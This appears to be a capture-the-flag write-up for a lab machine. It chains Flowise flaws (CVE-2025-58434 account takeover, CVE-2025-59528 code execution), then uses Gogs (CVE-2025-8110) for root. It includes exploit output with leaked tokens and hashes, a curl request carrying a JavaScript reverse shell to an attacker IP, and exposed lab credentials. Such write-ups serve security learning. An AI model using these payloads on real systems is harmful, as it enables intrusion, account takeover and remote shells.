---
title: "Hacking Flowise and getting system root via Gogs"
date: 2026-04-19 00:00:00 +0800
categories: [Bug bounty, hacking]
tags: [Bug bounty, CTF, Hacking]
--- 

# Introduction
In this post, we are gonna use  hack into a open source tool designed for creating AI agents through a simple drag-and-drop interface, chaining  CVE-2025-59528 and CVE-2025-58434
getting root with an internal gogs service running as a root process, vulnerable to CVE-2025-8110.

# Start
As always, i started with a Rustscan --> Nmap scan:
```bash
❯ rustscan -a 10.129.20.19 --ulimit 5000

Open 10.129.20.19:22  
Open 10.129.20.19:80
``` 

```bash
❯ nmap -sT -A -Pn -T5 -p 22,80 10.129.20.19 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout  
100ms -v

22/tcp filtered ssh  
80/tcp open     http    nginx 1.24.0 (Ubuntu)  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: nginx/1.24.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://silentium.htb/  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since we discovered that the domain is "silentium.htb" let's add it in to our /etc/hosts file to resolve it
`echo '10.129.20.19 silentium.htb' `

# Technologies 
Let's find out which technologies this website is using

```bash
❯ whatweb silentium.htb

http://silentium.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubunt  
u)], IP[10.129.20.19], Script, Title[Silentium | Institutional Capital & Lending Solutions], nginx[1.24.  
0]
```
Before of going in the website, let's leave some background assets fuzzer/discovery tool to map the website better.
1. VHost enumeration
2. Assets enumeration

```bash
❯ ffuf -u http://silentium.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20  
000.txt -fc 404 -H "HOST:FUZZ.silentium.htb" -fs 178

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 148ms]
```

```
❯ feroxbuster -u http://silentium.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt  -X 404
Output: nothing interesting
```

# Webapp
Let's take a look in both website
The main one:

<img width="1250" height="703" alt="image" src="https://github.com/user-attachments/assets/565020a4-1ae6-4158-870b-9ee3549f20e8" />

Looks like a simple website doing nothing that funny

staging.silentium.htb
<img width="1084" height="622" alt="image" src="https://github.com/user-attachments/assets/1e6d9dc3-1b15-428e-b953-4d58454e8b94" />
<img width="549" height="138" alt="image" src="https://github.com/user-attachments/assets/f94cfa6d-a0b8-46e1-beb9-e299c3f11baa" />

here we have something interesting:
- The Website is using flowise
- When a user is not found a message pop up revealing it
- We have a forgot password endpoint

Before of enumerating versions and looking up for CVE, let's first try some classic techniques.

In the login page, i changed the input type from email to text, to bypass frontend field format verification and attempted to go with some sql injection payload like admin'OR 1=1-- -

<img width="304" height="52" alt="image" src="https://github.com/user-attachments/assets/7ca6eaca-0b5d-4bb0-a3ee-54d4691dfc7a" />

Here we have been unlucky, let's move on

<img width="734" height="327" alt="image" src="https://github.com/user-attachments/assets/da2df595-0c28-4a4e-ba4f-b4c2f60ab84f" />

Here we had a problem: in order to reset the password, we must have:
- A Valid Email
- A valid reset token

<img width="549" height="644" alt="image" src="https://github.com/user-attachments/assets/9ec8cad9-179e-4714-8ecd-3ced652b3b20" />

# User enumeration
Since the page actually returns a response 404 and a message saying "User not found" when an user is not found: we can take advantage of this behaviour.
<img width="993" height="109" alt="image" src="https://github.com/user-attachments/assets/f093ad2c-676a-4b0d-873d-16ad10349f3f" />

A curl request would look like thise:
```bash
curl 'http://staging.silentium.htb/api/v1/account/forgot-password' \
  -H 'Accept: application/json, text/plain, */*' \
  -H 'Accept-Language: en-US,en;q=0.7' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/json' \
  -H 'Origin: http://staging.silentium.htb' \
  -H 'Referer: http://staging.silentium.htb/forgot-password' \
  -H 'Sec-GPC: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36' \
  -H 'x-request-from: internal' \
  --data-raw '{"user":{"email":"admin@a.htb"}}' \
  --insecure
```

So i used those parameter to build a perfect payload for ffuf

```bash
❯ ffuf -u http://staging.silentium.htb//api/v1/account/forgot-password -w /usr/share/wordlists/seclists/  
Usernames/xato-net-10-million-usernames.txt -fc 404 -d '{"user":{"email":"FUZZ@silentium.htb"}}' -X POST  
-H "Content-Type: application/json" -H 'Origin: http://staging.silentium.htb'    -H 'Accept: applicatio  
n/json, text/plain, */*'

```
### Rate limiter
Here i spotted another issue: Rate limiter

<img width="678" height="130" alt="image" src="https://github.com/user-attachments/assets/f2acf52a-98c3-425b-bb44-f3e65671a871" />

I tried to enumerate api to see if i could have spotted something interesting, but no luck:

```bash
http://staging.silentium.htb/api/v1/attachments  
http://staging.silentium.htb/api/v1/feedback  
http://staging.silentium.htb/api/v1/feedback_js  
http://staging.silentium.htb/api/v1/ip  
http://staging.silentium.htb/api/v1/ipc  
http://staging.silentium.htb/api/v1/ipdata  
http://staging.silentium.htb/api/v1/iphone  
http://staging.silentium.htb/api/v1/ipn  
http://staging.silentium.htb/api/v1/ipod  
http://staging.silentium.htb/api/v1/ipp  
http://staging.silentium.htb/api/v1/ips  
http://staging.silentium.htb/api/v1/ips_kernel  
http://staging.silentium.htb/api/v1/leads  
http://staging.silentium.htb/api/v1/ping  
http://staging.silentium.htb/api/v1/pingback  
http://staging.silentium.htb/api/v1/pricing  
http://staging.silentium.htb/api/v1/settings  
http://staging.silentium.htb/api/v1/version  
http://staging.silentium.htb/api/v1/version.json
```

Actually i found an interesting endpoint, whichj is:
/api/v1/ip  
<img width="1881" height="129" alt="image" src="https://github.com/user-attachments/assets/323ed224-bbee-491f-8e1e-9ea49c58596c" />

having seen that message, i tried to use some parameter to bypass rate limiter, i wanted to use `X-Forwaded-Host: 127.0.0.1`
But the ip haven't changed:
<img width="944" height="124" alt="image" src="https://github.com/user-attachments/assets/a6fe52c5-3981-4db9-a3b8-45c0516ac706" />

After took a further look into the website main page, i noticed that some name were exposed:
<img width="1307" height="428" alt="image" src="https://github.com/user-attachments/assets/aed82d0b-ea82-4c11-949d-e4d389c5086f" />

Therefore, i tried to build a list consisting of all the name combination

```
❯username-anarchy --input-file ./user >> users.txt
for i in $(cat user.txt);do echo $i@silentium.htb;done >> email.txt
```

<img width="250" height="349" alt="image" src="https://github.com/user-attachments/assets/009e7fd0-38e1-4e2d-8202-8df14659b90f" />

Having a list full of emails, i tried try to put a time limiter,  but i had some problem using ffuf timeout, so i built a script to having more control on the fuzzing

<img width="1119" height="880" alt="image" src="https://github.com/user-attachments/assets/91f3bd8d-8a0b-4d3d-a9d4-95f6bb680922" />

<img width="385" height="378" alt="image" src="https://github.com/user-attachments/assets/40423f63-7146-4a2e-b88f-a70ce3754ddf" />

After i while, i found out ben was a valid one!

I tried to look up for some CVE and found out the following CVEs:
CVE-2025-58434 : 
In version 3.0.5 and earlier, the `forgot-password` endpoint in Flowise returns sensitive information including a valid password reset 
`tempToken` without authentication or verification. This enables any attacker to generate a reset token for arbitrary users and directly
reset their password, leading to a complete account takeover (ATO).

This, combined to : 
CVE-2025-59528 :
The CustomMCP node allows users to input configuration settings for connecting to an external MCP server. 
This node parses the user-provided mcpServerConfig string to build the MCP server configuration.
However, during this process, it executes JavaScript code without any security validation.

# Ben account take over
I used this PoC https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC.git that automates the ATO

```bash
❯ python3 main.py --url http://staging.silentium.htb --email ben@silentium.htb  
  
  
 ███████╗██╗      ██████╗ ██╗    ██╗██╗███████╗███████╗  
 ██╔════╝██║     ██╔═══██╗██║    ██║██║██╔════╝██╔════╝  
 █████╗  ██║     ██║   ██║██║ █╗ ██║██║███████╗█████╗  
 ██╔══╝  ██║     ██║   ██║██║███╗██║██║╚════██║██╔══╝  
 ██║     ███████╗╚██████╔╝╚███╔███╔╝██║███████║███████╗  
 ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝  
  
 ════════════════════════════════════════════════════════════════════  
 CVE-2025-58434 │ Account Takeover via Token Disclosure │ CVSS 9.8 Critical  
 CVE-2025-59528 │ Authenticated RCE via CustomMCP Node  │ CVSS Critical       
 ════════════════════════════════════════════════════════════════════  
   ⚠  FOR EDUCATIONAL / AUTHORIZED SECURITY TESTING ONLY  ⚠  
 ════════════════════════════════════════════════════════════════════  
  
 ════════════════════════════════════════════════════════════════════  
   FULL CHAIN MODE  │  CVE-2025-58434 → CVE-2025-59528  
 ════════════════════════════════════════════════════════════════════  
  
 [Step 1] [CVE-2025-58434] Requesting forgot-password token ...  
 [*] Endpoint : http://staging.silentium.htb/api/v1/account/forgot-password  
 [*] Email    : ben@silentium.htb  
 [*] HTTP 201  
  
 ────────────────────────────────────────────────────────────────────  
   LEAKED ACCOUNT DATA  
 ────────────────────────────────────────────────────────────────────  
 User ID       : e26c9d6c-678c-4c10-9e36-01813e8fea73  
 Name          : admin  
 Email         : ben@silentium.htb  
 Credential    : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG  
 Status        : active  
 tempToken     : aBDbt6IkNKfBTeP3SaUFxCeUpsxkChSy2kqjjyUKOASTsykIz1OO85QRg599rIzY  
 tokenExpiry   : 2026-04-14T08:43:22.327Z  
 ────────────────────────────────────────────────────────────────────  
 [+] tempToken  : aBDbt6IkNKfBTeP3SaUFxCeUpsxkChSy2kqjjyUKOASTsykIz1OO85QRg599rIzY  
 [+] Expiry     : 2026-04-14T08:43:22.327Z  
 [!] VULNERABLE — token disclosed without authentication!  
  
 [Step 2] [CVE-2025-58434] Resetting password → Flowise@Pwn3d2025!  
 [*] Endpoint     : http://staging.silentium.htb/api/v1/account/reset-password  
 [*] New password : Flowise@Pwn3d2025!  
 [*] HTTP 201  
 [+] Password reset SUCCESSFUL (tempToken cleared)  
 [+] Account takeover complete  →  ben@silentium.htb / Flowise@Pwn3d2025!  
  
 [Step 3] [Auth] Logging in to extract session cookies ...  
 [*] Endpoint : http://staging.silentium.htb/api/v1/auth/login  
 [*] Email    : ben@silentium.htb  
 [*] HTTP 200  
  
 ────────────────────────────────────────────────────────────────────  
   EXTRACTED SESSION COOKIES  
 ────────────────────────────────────────────────────────────────────  
 token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...  
 refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...  
 connect_sid    : s%3ABuyYIhQ4E4fTb6rscXv_7i2WCKTeTv75.78bC%2BfF9pnM4PVoP9KIPIdqtlV22q9cyv...  
 ────────────────────────────────────────────────────────────────────  
 [+] Session cookies obtained ✓  
  
 [Step 4] [CVE-2025-59528] Executing RCE via CustomMCP ...  
 [*] Endpoint : http://staging.silentium.htb/api/v1/node-load-method/customMCP  
 [*] Command  : id  
 [*] Payload  : ({x:(function(){const cp=process.mainModule.require("child_process");const out=cp.execS  
y...  
 [*] HTTP 200  
  
 ────────────────────────────────────────────────────────────────────  
   RCE RESULT  
 ────────────────────────────────────────────────────────────────────  
 Command : $ id  
  
   [{'label': 'No Available Actions', 'name': 'error', 'description': 'No available actions, please che  
ck your API key and refresh'}]  
  
 [+] RCE confirmed!  
 ────────────────────────────────────────────────────────────────────  
  
 ════════════════════════════════════════════════════════════════════  
   CHAIN COMPLETE  
 ════════════════════════════════════════════════════════════════════  
 CVE-2025-58434  ✓  ATO   → ben@silentium.htb / Flowise@Pwn3d2025!  
 CVE-2025-59528  ✓  RCE   → 'id' executed on server  
 ════════════════════════════════════════════════════════════════════
```

This actually didn't worked, so i tried to do it manually and successfully gained access as ben user

<img width="612" height="670" alt="image" src="https://github.com/user-attachments/assets/14cf49ac-01ef-42ac-a84f-66e0aab531ef" />
<img width="1900" height="810" alt="image" src="https://github.com/user-attachments/assets/03b951af-60ed-494d-9051-744cb3ae4299" />

after looking up for CVE-2025-59528 and understanding how that works , i tried to get RCE
https://www.sonicwall.com/it-it/blog/flowiseai-custom-mcp-node-remote-code-execution-

- **Vulnerable Flowise Version**: The target must be running FlowiseAI Flowise version >= 2.2.7-patch.1 and < 3.0.6. ( OK )
- **Network Access to API**: The attacker must have network access to the Flowise API endpoint /api/v1/node-load-method/customMCP (typically on port 3000).
- **No Authentication Required**: While Flowise supports optional API key authentication, the vulnerability can be exploited without credentials when authentication is not configured — a common deployment scenario. When authentication is enabled, a valid API token is sufficient.
- **CustomMCP Component Loaded**: The Flowise instance must have the CustomMCP node component available in its component pool (included by default in standard installations).
- **POST Request Capability**: The attacker must be able to send HTTP POST requests with a JSON body to the vulnerable endpoint.

and the request should have looked like:
<img width="657" height="167" alt="image" src="https://github.com/user-attachments/assets/476f1735-dd49-4175-8b6a-b58d87ffcfad" />
i tried to build a curl command with the following payload
```bash
curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC05ZTM2LTAxODEzZThmZWE3MyIsInVzZXJuYW1lIjoiYWRtaW4iLCJtZXRhIjoiYTdhMGZlZmVmMzNmMTEzYmQ3MWNiNWY0YTY3MGI1NTc6YTIyMjg1NmEwZTc4YTIyZmNkNzkzZGViY2IxMDA5MjY3N2U2NWY2YWJiODg5MjNhZDU3NDBiMmQ2NjI3ZDk1MmRlMDM4ZWMyZTAzNGMyMGFhODMyMDNkYzZmODAzOWI2YjczNzA4ZTI4MzhiOTBhMzYxMjkzMzFhZDZlMjUyNDIzNDhjY2IzOGMxODE4Nzg3NWNkZDk2MTE3MzQzMzliZSIsImlhdCI6MTc3NjE1NTc5OCwibmJmIjoxNzc2MTU1Nzk4LCJleHAiOjE3NzYxNzczOTgsImF1ZCI6IkFVRElFTkNFIiwiaXNzIjoiSVNTVUVSIn0.5XRvwsdTvTJuDeJNdYIT08INo3SqHqysAlioV3ns8CY" \
  -d '{
    "loadMethod": "listTools",
    "nodeData": {
      "inputs": {
        "mcpServerConfig": "({x:(function(){ const cp = process.mainModule.require(\"child_process\"); const net = process.mainModule.require(\"net\"); const sh = cp.spawn(\"/bin/sh\", [\"-i\"]); const client = new net.Socket(); client.connect(1515, \"10.10.14.146\", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return 1; })()})"
      }
    }
  }'
```

# Container escape and SSH access
At that point, the big was already done, just after starting enumerate the server,i instantly noticed with `env` that the flowise password was exposed

```bash
|   |   |
|---|---|
|`FLOWISE_USERNAME`|`ben`|
|`FLOWISE_PASSWORD`|`F1l3_d0ck3r`|
|`SMTP_PASSWORD`|`r04D!!_R4ge`|
|`SMTP_HOST`|`mailhog`|
|`JWT_AUTH_TOKEN_SECRET`|`AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD`|
```

After attempted to login with user ben using that password, i was able to login!

# Privilege escalation
After enumerating: caps.. process.. exposed config files.. user permission.. SUID binaries etc etc, i tried taking a look at internal service

`ss -tulpn`

```bash
udp      UNCONN    0         0                 127.0.0.54:53                 0.0.0.0:*                     
udp      UNCONN    0         0              127.0.0.53%lo:53                 0.0.0.0:*                     
udp      UNCONN    0         0                    0.0.0.0:68                 0.0.0.0:*                     
tcp      LISTEN    0         4096               127.0.0.1:8025               0.0.0.0:*                     
tcp      LISTEN    0         4096               127.0.0.1:1025               0.0.0.0:*                     
tcp      LISTEN    0         4096           127.0.0.53%lo:53                 0.0.0.0:*                     
tcp      LISTEN    0         4096               127.0.0.1:3001               0.0.0.0:*                     
tcp      LISTEN    0         4096               127.0.0.1:3000               0.0.0.0:*                     
tcp      LISTEN    0         511                  0.0.0.0:80                 0.0.0.0:*                     
tcp      LISTEN    0         4096                 0.0.0.0:22                 0.0.0.0:*                     
tcp      LISTEN    0         4096              127.0.0.54:53                 0.0.0.0:*                     
tcp      LISTEN    0         4096               127.0.0.1:32815              0.0.0.0:*                     
tcp      LISTEN    0         511                     [::]:80                    [::]:*                     
tcp      LISTEN    0         4096                    [::]:22                    [::]:*
```

i forwarded the 3001 port to my host
GOGS:
<img width="821" height="381" alt="image" src="https://github.com/user-attachments/assets/d7d61f24-ac37-40b6-bbd2-eb8a44abd884" />
I was able to register an account and after getting the version, i was able to exploit CVE-2025-8110, injecting my SSH key successfully getting access as root

<img width="1776" height="1003" alt="image" src="https://github.com/user-attachments/assets/71cda10b-de14-4ab3-b8b6-f286f533b486" />
Thanks for having read this post!
